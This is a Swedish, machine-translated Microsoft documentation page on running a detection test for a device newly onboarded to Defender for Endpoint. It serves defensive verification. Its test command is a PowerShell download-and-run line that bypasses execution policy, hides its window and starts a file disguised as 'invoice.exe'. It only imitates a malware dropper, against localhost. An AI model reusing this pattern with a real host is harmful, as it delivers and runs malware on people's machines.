---
title: Köra ett identifieringstest på en nyligen onboarded Microsoft Defender för Endpoint-enhet
description: Kör identifieringsskriptet på en nyligen onboarded enhet för att verifiera att den är korrekt onboarded till Microsoft Defender för slutpunktstjänsten.
keywords: identifieringstest, identifiering, powershell, skript, verifiera, onboarding, microsoft defender för slutpunkts onboarding, klienter, servrar, test
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 2bb1fde1bfd8ddfa358d1141c3821843e532a8bf
ms.sourcegitcommit: efb932db63ad3ab4af4b585428d567d069410e4e
ms.translationtype: MT
ms.contentlocale: sv-SE
ms.lasthandoff: 05/11/2021
ms.locfileid: "52312006"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Köra ett identifieringstest på en nyligen onboarded Microsoft Defender för Endpoint-enhet 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**Gäller för:**
- Stöds Windows 10 versioner
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server, version 1803
- Windows Server, 2019
- [Microsoft Defender för Endpoint](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Vill du uppleva Microsoft Defender för Slutpunkt? [Registrera dig för en kostnadsfri utvärderingsversion.](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

Kör följande PowerShell-skript på en nyligen onboarded-enhet för att verifiera att den rapporterar till Defender för Slutpunkt-tjänsten.

1. Skapa en mapp: 'C:\test-MDATP-test'.
2. Öppna en upphöjd kommandoradsfråga på enheten och kör skriptet:

   1. Gå till **Start** och skriv **cmd**.

   1. Högerklicka på **Kommandotolken** och välj **Kör som administratör.**

      ![Start-menyn i ett fönster som pekar på Kör som administratör](images/run-as-admin.png)

3. När du uppmanas till det kopierar du och kör följande kommando:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

Fönstret Kommandotolken stängs automatiskt. Om det lyckas markeras det som slutfört och en ny avisering visas i portalen för den onboarded enheten om ungefär 10 minuter.

## <a name="related-topics"></a>Relaterade ämnen
- [Registrera Windows 10-enheter](configure-endpoints.md)
- [Onboard servers](configure-server-endpoints.md)
- [Felsöka problem med Introduktion till Slutpunkt för Microsoft Defender](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
